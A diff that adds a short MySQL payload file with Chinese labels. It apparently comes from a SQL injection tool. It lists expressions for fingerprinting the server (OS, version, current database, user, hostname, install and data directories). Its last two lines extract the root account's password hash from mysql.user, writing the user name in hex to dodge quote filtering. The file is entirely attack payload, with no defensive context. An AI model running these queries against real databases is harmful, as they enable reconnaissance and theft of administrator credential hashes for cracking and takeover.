@@ -1,0 +1,9 @@
+﻿操作系统：@@version_compile_os
+数据库版本：version()
+当前数据库：database()
+当前用户：user()
+主机名称：@@hostname
+安装目录：@@basedir
+数据目录：@@datadir
+RootHash[password]：(select password from mysql.user where User=0x726F6F74 limit 0,1)
+RootHash[authentication_string]：(select cast(authentication_string as char(50)) from mysql.user where User=0x726F6F74 limit 0,1)
